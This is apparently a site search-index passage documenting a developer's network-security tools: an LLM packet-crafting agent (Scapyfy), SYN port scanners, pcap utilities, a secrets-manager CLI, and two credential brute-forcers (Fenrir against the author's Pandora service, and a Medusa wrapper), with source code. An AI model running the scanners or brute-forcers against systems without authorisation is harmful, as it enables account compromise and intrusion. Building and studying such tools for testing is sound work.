tools.\"\n)\nuser_prompt = HumanMessagePromptTemplate.from_template(\n    \"Situation:\\n'''{situation}'''\"\n)\nprompt = ChatPromptTemplate.from_messages([\n    system_prompt,\n    user_prompt,\n    MessagesPlaceholder(variable_name=\"agent_scratchpad\"),\n])\ntools = [send_pkt, final_report]\nname2tool = {tool.name: tool.func for tool in tools}\n\n\nclass CustomExecutor:\n    def __init__(self, max_iterations: int) -&gt; None:\n        self.max_iterations = max_iterations\n        self.agent: RunnableSerializable = (\n                {\"situation\": lambda x: x[\"situation\"],\n                \"agent_scratchpad\": lambda x: x.get(\"agent_scratchpad\")}\n                | prompt\n                | llm.bind_tools(tools, tool_choice=\"any\")\n        )\n\n    def invoke(self, situation: str) -&gt; str:\n        agent_scratchpad = []\n        for _ in range(self.max_iterations):\n            tool_call = self.agent.invoke(\n                {\n                    \"situation\": situation,\n                    \"agent_scratchpad\": agent_scratchpad\n                }\n            )\n            if not tool_call.tool_calls:\n                raise Exception(\"No tool calls from agent\")\n            for tool_call in tool_call.tool_calls:\n                agent_scratchpad.append(AIMessage(content=\"\", tool_calls=[tool_call]))\n                tool_name = tool_call[\"name\"]\n                tool_args = tool_call[\"args\"]\n                tool_call_id = tool_call[\"id\"]\n\n                try:\n                    tool_output = name2tool[tool_name](**tool_args)\n                except Exception as e:\n                    tool_output = f\"Tool execution error: {e}\"\n\n                # Add logging here\n                log_tool_execution(tool_name, tool_args, tool_output, current_user, current_session_id)\n\n                agent_scratchpad.append(ToolMessage(\n                    content=str(tool_output),\n                    tool_call_id=tool_call_id\n                ))\n                if tool_name == \"final_report\":\n                    return str(tool_output)\n        raise Exception(\"Maximum Number of Iterations Exceeded\")\n\n    def __enter__(self):\n        return self\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        pass\n\n\ndef llm_crafter(prompt: str, user: str, max_iterations: int) -&gt; str:\n    global current_user, current_session_id\n    current_user = user\n    current_session_id = str(uuid.uuid4())[:8]\n\n    # Log session start\n    log_session_start(prompt, user, current_session_id)\n\n    with CustomExecutor(max_iterations=max_iterations) as executor:\n        report = executor.invoke(situation=prompt)\n\n        # Log session end\n        log_session_end(report, user, current_session_id)\n\n        return report\n</code></pre> <p></p>"},{"location":"projects/scapyfy/#scapyfy","title":"\ud83e\uddd9\u200d\u2642\ufe0f Scapyfy","text":"<p>Scapyfy is a secure LLM agent that performs packet crafting tasks on your behalf. The agent utilizes OpenAI services for intelligent decision-making and operates behind an API secured with JWT authentication.</p> <p>The name is a portmanteau of the popular packet crafting tool, Scapy, and the suffix -fy, which evokes a sense of Harry Potter magic.</p>"},{"location":"projects/scapyfy/#requirements","title":"\ud83d\udee0\ufe0f Requirements","text":"<p>To run Scapyfy, you will need the following:</p> <ol> <li>A Linux machine (desktop, server, etc.).</li> <li>Superuser privileges (<code>sudo</code>).</li> <li>Python 3.</li> <li>An OpenAI API Key to utilize the AI functionalities.</li> </ol>"},{"location":"projects/scapyfy/#installation","title":"\ud83d\ude80 Installation","text":"<p>Follow these steps to get Scapyfy set up:</p> <ol> <li>Clone the repository: <pre><code>git clone [https://github.com/MustafaAbdulazizHamza/Scapyfy.git](https://github.com/MustafaAbdulazizHamza/Scapyfy.git)\ncd Scapyfy\n</code></pre></li> <li>Install dependencies in a virtual environment:<ul> <li>Create a virtual environment named <code>scapyfy-env</code> and activate it.</li> <li>Install the required Python packages. <pre><code>python3 -m venv scapyfy-env\nsource scapyfy-env/bin/activate\npython3 -m pip install -r requirements.txt\n</code></pre></li> </ul> </li> <li>Set the API Key:<ul> <li>Set the environment variable <code>OPENAI_API_KEY</code> to your OpenAI access key.</li> <li>Recommendation: Use a <code>.env</code> file to securely store this secret: <pre><code># .env file content\nOPENAI_API_KEY=&lt;YOUR API KEY&gt;\n</code></pre></li> </ul> </li> </ol>"},{"location":"projects/scapyfy/#execution","title":"\ud83c\udfc3 Execution","text":"<p>To run Scapyfy, simply execute the <code>execute.sh</code> script. Since packet crafting requires low-level access, the script must be run with superuser privileges.</p> <p>You can optionally enable HTTPS/TLS by passing the paths to your digital certificates as command-line interface (CLI) parameters.</p> <ul> <li>Execution without TLS: <pre><code>sudo bash execute.sh\n</code></pre></li> <li>Execution with TLS: <pre><code>sudo bash execute.sh &lt;ssl_certfile_path&gt; &lt;ssl_keyfile_path&gt;\n</code></pre></li> </ul>"},{"location":"projects/scapyfy/#active-vs-passive-crafting","title":"\u26a1 Active vs. Passive Crafting","text":"<p>Scapyfy offers two distinct modes for packet crafting:</p> <ul> <li> <p>Active Crafting: This is a full-cycle, interactive process. The LLM crafts the necessary packets, and the Scapyfy agent sends them over the wire. After the interaction, the agent analyzes the results (e.g., received packets, timeouts) and provides you with a detailed report of its findings.</p> </li> <li> <p>Passive Crafting: This is a \"generation-only\" mode. The LLM crafts the suitable packet(s) based on your prompt, but they are not sent. Instead, the agent returns the complete packet structure to you as a JSON object. This is useful for learning, reviewing packet structures, or using the data in other tools.</p> </li> </ul>"},{"location":"projects/scapyfy/#notes","title":"\ud83d\udcdd Notes","text":"<ol> <li>API Documentation: The full API documentation is available at the <code>/docs</code> endpoint after execution.</li> <li>CLI Tool: To interact with Scapyfy from your terminal, you can use the dedicated command-line tool, Scapyfy-CLI, available here).</li> </ol>"},{"location":"tools/TCP_PortScanner/","title":"TCP_PortScanner","text":"DescriptionCodeExampleDownload <p>A simple TCP SYN port scanner that uses threading to speed up the scanning process.  </p> TCP_PortScanner.py<pre><code>from scapy.all import IP, TCP, RandShort, sr1, send\nfrom concurrent.futures import ThreadPoolExecutor\nfrom rich.table import Table\nfrom rich.console import Console\n\nclass Scanner:\n    def __init__(self, target: str, ports: str) -&gt; None:\n        self._target = target\n        if '-' in ports:\n            self._ports = self._port_range(ports)\n        elif ',' in ports:\n            self._ports = [int(port.strip()) for port in ports.split(\",\")]\n        else:\n            self._ports = [int(ports)]\n\n    def _port_range(self, ports: str):\n        start, end = map(int, ports.split('-'))\n        return list(range(start, end + 1))\n\n    def _scan(self, port: int):\n        pkt = IP(dst=self._target)/TCP(sport=RandShort(), dport=port, flags=\"S\")\n        resp = sr1(pkt, timeout=2, verbose=False)\n\n        if resp is None:\n            return [port, \"Filtered or No Response\"]\n        elif resp.haslayer(TCP):\n            flag = resp[TCP].flags\n            if flag == 0x12:\n                send(IP(dst=self._target)/TCP(dport=port, sport=RandShort(), flags=\"R\"), verbose=False)\n                return [port, \"Open\"]\n            elif flag == 0x14:\n                return [port, \"Closed\"]\n        return [port, \"Unknown\"]\n\n    def scan(self):\n        console = Console()\n        table = Table(show_header=True, header_style=\"none\", show_lines=False)\n        table.add_column(\"Port\", justify=\"right\", style=\"none\")\n        table.add_column(\"Status\", justify=\"left\", style=\"none\")\n\n        with ThreadPoolExecutor() as executor:\n            results = executor.map(self._scan, self._ports)\n            for port, status in results:\n                table.add_row(str(port), status)\n        console.print(table)\n</code></pre> scanner.py<pre><code>from TCP_PortScanner import Scanner\nscanner = Scanner(\"192.168.1.1\", \"20-25\")\nscanner.scan()\n</code></pre> <p></p>"},{"location":"tools/cerberus/","title":"Cerberus","text":"DescriptionCodeHelpDownload <p>Cerberus is a Golang-based port scanner designed to detect a running Pandora server during the reconnaissance phase. The tool performs a full TCP scan, followed by an HTTPS probe to check for the presence of a valid https://IP:Port/secret endpoint. If such an endpoint is discovered, it confirms that Pandora is running on the associated port.</p> main.go<pre><code>package main\nimport (\n    \"flag\"\n    \"fmt\"\n    \"os\"\n    \"strings\"\n)\nvar (\n    ports  = make(chan int, 400)\n    result = make(chan string, 400)\n)\nfunc main() {\n    target := flag.String(\"t\", \"\", \"The target IP address or hostname\")\n    ports := flag.String(\"p\", \"\", \"The port(s) to scan, separated by commas\")\n    PandoraScan := flag.Bool(\"v\", false, \"Enable Pandora-specific scanning mode\")\n    flag.Parse()\n    if *target == \"\" || *ports == \"\" {\n        fmt.Println(\"Error: Missing required flags.\")\n        flag.Usage()\n        os.Exit(1)\n    }\n    ports_range := getPortsRange(*ports)\n    ts := strings.Split(*target, \",\")\n    for _, target := range ts {\n        scan(target, ports_range, *PandoraScan)\n    }\n}\n</code></pre> <pre><code>./Cerberus [options]\nOptions\n-p string\n    Specifies the port(s) to scan, separated by commas.\n-t string\n    Specifies the target IP address or hostname.\n-v\n    Enables Pandora-specific scanning mode.\n</code></pre> <p></p>"},{"location":"tools/fenrir/","title":"Cerberus","text":"DescriptionCodeHelpDownload <p>Fenrir is a brute-forcing tool designed specifically to target the Pandora service as part of this project. It operates by sending HTTPS requests with credentials sourced from a dictionary. The tool halts either upon successful authentication with valid credentials or after exhausting all entries in the wordlist without success.</p> main.go<pre><code>package main\nimport (\n    \"bufio\"\n    \"bytes\"\n    \"crypto/tls\"\n    \"flag\"\n    \"fmt\"\n    \"log\"\n    \"net/http\"\n    \"os\"\n    \"strings\"\n    \"time\"\n)\nfunc main() {\n    target := flag.String(\"t\", \"\", \"Target host (IP or domain)\")\n    port := flag.Int(\"s\", 0, \"Port number for the Pandora server\")\n    users := flag.String(\"u\", \"\", \"File path to the list of usernames\")\n    passwords := flag.String(\"p\", \"\", \"File path to the password dictionary\")\n    flag.Parse()\n    if *target == \"\" || *port == 0 || *users == \"\" || *passwords == \"\" {\n        fmt.Println(\"Error: Missing required flags.\")\n        flag.Usage()\n        os.Exit(1)\n    }\n    userDict, err := os.Open(*users)\n    if err != nil {\n        log.Fatal(err)\n    }\n    defer userDict.Close()\n    userScanner := bufio.NewScanner(userDict)\n    passwordsDict, err := os.Open(*passwords)\n    if err != nil {\n        log.Fatal(err)\n    }\n    defer passwordsDict.Close()\n    body := []byte(`\"secret-id\":\"secretID\"`)\n    for userScanner.Scan() {\n        user := strings.TrimSpace(userScanner.Text())\n        passwordsDict.Seek(0, 0)\n        passwordScanner := bufio.NewScanner(passwordsDict)\n        for passwordScanner.Scan() {\n            password := strings.TrimSpace(passwordScanner.Text())\n            re, err := sendHTTPRequest(\"GET\", fmt.Sprintf(\"https://%s:%d/secret\", *target, *port), user, password, string(body))\n            if err == nil {\n                if re.StatusCode != 401 &amp;&amp; re.StatusCode != 500 {\n                    log.Printf(\"Account Found: Username: %s, Password: %s (Success)\\n\", user, password)\n                    break\n                } else {\n                    log.Printf(\"Account Check - Username: %s, Password: %s\\n\", user, password)\n                }\n            }\n        }\n    }\n}\n</code></pre> <pre><code>./Fenrir [options]\nOptions\n-p string\n    Specifies the file path to the password dictionary.\n-s int\n    Defines the port number for the Pandora server.\n-t string\n    Specifies the target host (IP address or domain).\n-u string\n    Provides the file path to the list of usernames.\n</code></pre> <p></p>"},{"location":"tools/ip2mac/","title":"ip2mac","text":"DescriptionCodeHelpDownload <p>ip2mac is a tool that extracts the MAC address linked to a specific IP address from a PCAP file.</p> ip2mac.py<pre><code>from scapy.all import rdpcap\nfrom sys import argv, exit\nimport os\nimport logging\nlogging.basicConfig(\n    level=logging.INFO,\n    format='[%(asctime)s] %(levelname)s: %(message)s',\n    datefmt='%Y-%m-%d %H:%M:%S'\n)\nif len(argv) &lt; 3:\n    print(f\"Usage:\\n\\tpython3 {argv[0]} &lt;pcap file&gt; &lt;IP address&gt;\")\n    quit()\nif not os.path.isfile(argv[1]):\n    logging.error(f\"The file {argv[1]} was not found!\")\n    exit(404)\npkts = rdpcap(argv[1])\nfor pkt in pkts:\n    if pkt[\"IP\"].src == argv[2]:\n        logging.info(f\"Found MAC address {pkt['Ether'].src} corresponding to IP address {argv[2]}\")\n        exit(0)\nlogging.info(f\"No packet found with source IP {argv[2]}.\")\n</code></pre> Command<pre><code>python3 ip2mac.py capture.pcap 192.168.0.1\n</code></pre> <p></p>"},{"location":"tools/meanTCPStream/","title":"Mean TCP Stream","text":"DescriptionCodeExampleDownload <p>A Python class that computes the mean values of selected features for each TCP stream from a list of PCAP or PCAPNG files.</p> MeanTCPStream<pre><code>import pyshark\nimport os\nimport re\nfrom collections import defaultdict\nimport csv\nimport numpy as np\nclass MeanTCPStream:\n    def __init__(self, files: list[str], features: list[str], output: str):\n        if not os.path.isdir(os.path.dirname(output)):\n            raise NotADirectoryError(f\"Output directory does not exist: {os.path.dirname(output)}\")\n        self._pcaps = []\n        for fi in files:\n            if re.search(r\"\\.pcap(?:ng)?$\", fi):\n                print(f\"The file named {fi} is NOT a supported file type.\")\n                continue\n            if not os.path.isfile(fi):\n                print(f\"The file named {fi} was NOT found\")\n                continue\n            self._pcaps.append(fi)\n        self._features = features\n        self._output = output\n    def _extract_feature(self, packet: pyshark.packet.packet.Packet, feature_str: str) -&gt; int:\n        \"\"\"\n        Extracts a numeric feature from the packet based on dot notation.\n        Automatically handles hex-decoded fields.\n        \"\"\"\n        try:\n            layer_name, field_name = feature_str.split('.', 1)\n            layer = getattr(packet, layer_name, None)\n            if layer is not None and hasattr(layer, field_name):\n                attr = getattr(layer, field_name)\n                return int(attr, 16) if self._is_hex_string(attr) else int(attr)\n        except Exception:\n            pass\n        return 0\n    def _is_hex_string(self, value: str) -&gt; bool:\n        return isinstance(value, str) and value.lower().startswith(\"0x\")\n    def calculate(self):\n        \"\"\"\n        Performs mean calculation for each TCP stream and writes results to CSV.\n        \"\"\"\n        with open(\"tcp_stream_stats.csv\", \"w\", newline=\"\") as f:\n            writer = csv.writer(f)\n            writer.writerow([f\"{feat}_mean\" for feat in self._features])\n        streams = defaultdict(list)\n        for pcap in self._pcaps:\n            with pyshark.FileCapture(pcap, display_filter=\"tcp\") as packets:\n                for pkt in packets:\n                    streams[pkt.tcp.stream].append([ self._extract_feature(pkt, feature) for feature in self._features])\n            with open(\"tcp_stream_stats.csv\", \"a\", newline=\"\") as f:\n                writer = csv.writer(f)\n                for _, rows in streams.items():\n                    mtx = np.array(rows)\n                    stats = np.mean(mtx, axis=0, dtype=float)\n                    writer.writerow(list(stats))\n</code></pre> mean.py<pre><code># Import MeanTCPStream\nfrom meanTCPStream import MeanTCPStream\n# Define the list of your PCAP files\npcap_files = [\n    \"captures/capture1.pcap\",\n    \"captures/capture2.pcapng\"\n]\n# Define the features you want to calculate the mean for\nfeatures = [\n    \"tcp.flags\",\n    \"ip.ttl\"\n]\n# Define the path to the output CSV file\noutput_csv = \"results/tcp_stream_stats.csv\"\n# Create and invoke the class\nmean_stream = MeanTCPStream(pcap_files, features, output_csv)\nmean_stream.calculate()\n</code></pre> <p></p>"},{"location":"tools/medusa/","title":"Medusa","text":"DescriptionCodeExampleDownload <p>Medusa is a Python wrapper for the Medusa brute-force tool. It runs Medusa against a host using provided usernames, passwords, module, and port, captures successful logins, and saves results as JSON.</p> medusa.py<pre><code>import subprocess\nimport os\nimport sys\nimport json\nclass Medusa:\n    def __init__(self, usernames:str, wordlist:str, module:str, port: int) -&gt; None:\n        if not os.path.isfile(usernames):\n            print(\"The usernames file was not found!\")\n            sys.exit(404)\n        if not os.path.isfile(wordlist):\n            print(\"The wordlist file was not found!\")\n            sys.exit(404)\n        self._usernames = usernames\n        self._wordlist = wordlist\n        self._module = module\n        self.port = port\n        self.accounts = []\n    def Run(self, host:str) -&gt; None:\n        p = subprocess.run(f\"medusa -h {host} -M {self._module} -U {self._usernames} -P {self._wordlist} -n {self.port}\", shell=True, capture_output=True, text=True)\n        if p.returncode != 0:\n            print(p.stderr)\n            sys.exit(1)\n        out = [o for o in p.stdout.split(\"\\n\") if \"[SUCCESS]\" in o]\n        self.accounts[host] = [(out[i].split()[6], out[i].split()[8]) for i in range(len(out))]\n    def As_JSON(self, output: str) -&gt; None:\n        with open(output, 'w') as f:\n            js = json.dumps(self.accounts,indent=4)\n            f.write(js)\n</code></pre> example.py<pre><code>from medusa import Medusa\nmed = Medusa(\"users.txt\", \"wordlist.txt\", \"ssh\", 22)\nmed.Run(\"10.10.0.2\")\nmed.As_JSON(\"accounts.json\")\n</code></pre> <p></p>"},{"location":"tools/pandora-cli/","title":"Pandora CLI","text":"DescriptionCodeUser GuideDownload <p>Pandora CLI is an HTTPS client tool designed to provide a simple and intuitive interface for interacting with the Pandora Secrets Management System. It allows users to perform all necessary actions related to the Pandora server through a command-line interface.</p> main.go<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"github.com/spf13/cobra\"\n    \"os\"\n)\n\ntype Config struct {\n    URL          string `yaml:\"url\"`\n    RootUsername string `yaml:\"root_username\"`\n    RootPassword string `yaml:\"root_password\"`\n    Username     string `yaml:\"username\"`\n    Password     string `yaml:\"password\"`\n    PrivateKey   string `yaml:\"private_key\"`\n    PublicKey    string `yaml:\"public_key\"`\n}\n\nvar (\n    cfg Config\n)\n\nfunc main() {\n\n    rootCmd := &amp;cobra.Command{Use: \"pandora-client\"}\n    loc := getExecutableLocation()\n    loadConfig(fmt.Sprintf(\"%s/config.yaml\", loc))\n    // Add \"secret\" and \"user\" commands to the root command\n    rootCmd.AddCommand(SecretCmd(), UserCmd())\n\n    // Execute the root command\n    if err := rootCmd.Execute(); err != nil {\n        fmt.Println(err)\n        os.Exit(1)\n    }\n}\n</code></pre> <p></p>"},{"location":"tools/pandora-cli/#user-guide","title":"User Guide","text":""},{"location":"tools/pandora-cli/#prerequisites","title":"Prerequisites","text":"<ul> <li>Golang installed on the machine to compile the code.</li> </ul>"},{"location":"tools/pandora-cli/#installation","title":"Installation","text":"<ol> <li>Clone the repository: <pre><code>git clone https://github.com/MustafaAbdulazizHamza/Pandora-CLI.git\n</code></pre></li> <li>Generate or obtain your own RSA key pair (key.pem files).</li> <li>Compile the code: <pre><code>go build -o pandora-cli\n</code></pre></li> <li>Edit the configuration file with your credentials. Leave the root credentials blank if you are not the root user.</li> <li>Run the compiled executable. You can move it to any location, but ensure that the configuration file remains in the same directory as the executable.</li> </ol>"},{"location":"tools/pandora-cli/#user-management","title":"User Management","text":"<p>User management is a crucial part of any system. In Pandora, user management is primarily handled by the root user, with some exceptions allowing individual users to update their own passwords. 1. To add a new user: <pre><code>pandora-cli user add -u username1 -p password1\n</code></pre> 2. To update user credentials: <pre><code>pandora-cli user update -u username1 -p password2\n</code></pre> 3. To delete a user: <pre><code>pandora-cli user delete -u username1\n</code></pre></p>"},{"location":"tools/pandora-cli/#secret-management","title":"Secret Management","text":"<p>Pandora was initially developed as a secrets management system, with its primary responsibility being to allow users to securely add, retrieve, update, and delete their secrets in a centralized manner through simple API calls. 1. To add a secret: <pre><code>pandora-cli secret add -i secret_id -s secret1\n</code></pre> 2. To retrieve a secret: <pre><code>pandora-cli secret get -i secret_id\n</code></pre> 3. To update a secret: <pre><code>pandora-cli secret update -i secret_id -s secret2\n</code></pre> 4. To delete a secret: <pre><code>pandora-cli delete -i secret_id\n</code></pre></p>"},{"location":"tools/pkt2json/","title":"pkt2json","text":"DescriptionCodeExampleDownload <p>This script converts packets from a capture file (PCAP) into a descriptive JSON format. You can use this script by providing the input PCAP file and the output directory.</p> pkt2json.py<pre><code>if len(argv) != 3:\n    print(\"Usage:\\n\\tpython3 {} &lt;PCAP file&gt; &lt;Output Directory&gt;\".format(argv[0]))\n    exit(1)\nif not os.path.isfile(argv[1]):\n    print(\"The file named {} was NOT found!\".format(argv[1]))\n    exit(404)\nif not os.path.isdir(argv[2]): os.makedirs(argv[2])\npkts = rdpcap(argv[1])\nfor i, pkt in enumerate(pkts):\n    jsn = scapy_packet_to_json(pkt)\n    with open(os.path.join(argv[2], f\"pkt_{i}.json\"), \"w\") as jsf:\n        jsf.write(jsn) \n</code></pre> command<pre><code>python3 pkt2json.py capture.pcap output\n</code></pre> <p></p>"},{"location":"tools/scapyfy-cli/","title":"Scapyfy CLI","text":"DescriptionCodeDocumentationDownload <p>Scapyfy CLI is a cross-platform command-line interface (CLI) tool designed to be an HTTP client for the Scapyfy packet crafting agent. Developed in Go (Golang) and utilizing the Cobra library for command parsing, it offers a simple, powerful way to interact with the Scapyfy API.</p> main.go<pre><code>package main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"github.com/MustafaAbdulazizHamza/Scapyfy-CLI/cmd\"\n)\n\nfunc main() {\n    if err := cmd.Execute(); err != nil {\n        fmt.Fprintf(os.Stderr, \"Error: %v\\n\", err)\n        os.Exit(1)\n    }\n}\n</code></pre> <p></p>"},{"location":"tools/scapyfy-cli/#scapyfy-cli-cross-platform-http-client","title":"\ud83d\udcbb Scapyfy CLI: Cross-Platform HTTP Client","text":"<p>Scapyfy CLI is a cross-platform command-line interface (CLI) tool designed to be an HTTP client for the Scapyfy packet crafting agent. Developed in Go (Golang) and utilizing the Cobra library for command parsing, it offers a simple, powerful way to interact with the Scapyfy API.</p>"},{"location":"tools/scapyfy-cli/#requirements","title":"\u2699\ufe0f Requirements","text":"<ol> <li>Go (Golang): You must have Go installed on your system.</li> </ol>"},{"location":"tools/scapyfy-cli/#setting-up","title":"\ud83d\ude80 Setting Up","text":"<p>Follow these steps to set up and build the tool.</p> <p>1. Clone the repository (Same for Linux/macOS/Windows) (Requires Git to be installed) <pre><code>git clone [https://github.com/MustafaAbdulazizHamza/Scapyfy-CLI.git](https://github.com/MustafaAbdulazizHamza/Scapyfy-CLI.git)\n````\n\n**2. Build the tool (Same for Linux/macOS/Windows)**\n*First, navigate to the project directory:*\n\n```bash\ncd Scapyfy-CLI\n</code></pre></p> <p>Then, build the executable. This command is the same for Go on all platforms. It creates <code>Scapyfy-CLI</code> on Linux/macOS and <code>Scapyfy-CLI.exe</code> on Windows.</p> <pre><code>go build\n</code></pre> <p>3. Configure Credentials Find and edit the file named <code>scapyfy_config.json</code> in the project's root directory. Define your credentials and the URL of the Scapyfy server.</p> <pre><code>{\n\"username\": \"Your username\",\n\"password\": \"Password\",\n\"token\": \"\",\n\"base_url\": \"URL\"\n}\n</code></pre>"},{"location":"tools/scapyfy-cli/#basic-usage","title":"\ud83d\udca1 Basic Usage","text":"<p>Once built, you can run the executable from the current directory.</p> <p>1. Login Logs in using the credentials in <code>scapyfy_config.json</code>, retrieves the authentication token, and automatically updates the config file.</p> <ul> <li>Linux / macOS: <pre><code>./Scapyfy-CLI login\n</code></pre></li> <li>Windows (Command Prompt): <pre><code>.\\Scapyfy-CLI.exe login\n</code></pre></li> </ul> <p>2. Active Packet Crafting Sends the crafted packets and receives a detailed report after analysis.</p> <ul> <li>Linux / macOS: <pre><code>./Scapyfy-CLI craft --active --prompt \"Your prompt here\" --iters &lt;Number of iteration&gt;\n</code></pre></li> <li>Windows (Command Prompt): <pre><code>.\\Scapyfy-CLI.exe craft --active --prompt \"Your prompt here\" --iters &lt;Number of iteration&gt;\n</code></pre></li> </ul> <p>3. Passive Packet Crafting Returns only the crafted packet in JSON format without sending it for analysis.</p> <ul> <li>Linux / macOS: <pre><code>./Scapyfy-CLI craft --passive --prompt \"Your prompt here\"\n</code></pre></li> <li>Windows (Command Prompt): <pre><code>.\\Scapyfy-CLI.exe craft --passive --prompt \"Your prompt here\"\n</code></pre></li> </ul>"},{"location":"tools/scapyfy-cli/#command-flags-explained","title":"Command Flags Explained","text":"<ul> <li><code>--active</code>: Sends the crafted packets for active analysis after generation.</li> <li><code>--passive</code>: Returns the packet structure as JSON without active transmission/analysis.</li> <li><code>--prompt</code>: The LLM prompt describing the packet(s) you want to craft (e.g., \"Craft an ARP request packet\").</li> <li><code>--iters</code>: (Optional) Specifies the number of iterations the LLM is allowed before being forced to stop (default is 4). This flag is only relevant for the <code>--active</code> mode.</li> </ul>"},{"location":"tools/scapyfy-cli/#references","title":"\ud83d\udcda References","text":"<ol> <li>Scapyfy:</li> <li>User Guide: For a complete list of commands and flags, use the <code>--help</code> argument.</li> </ol>"}]}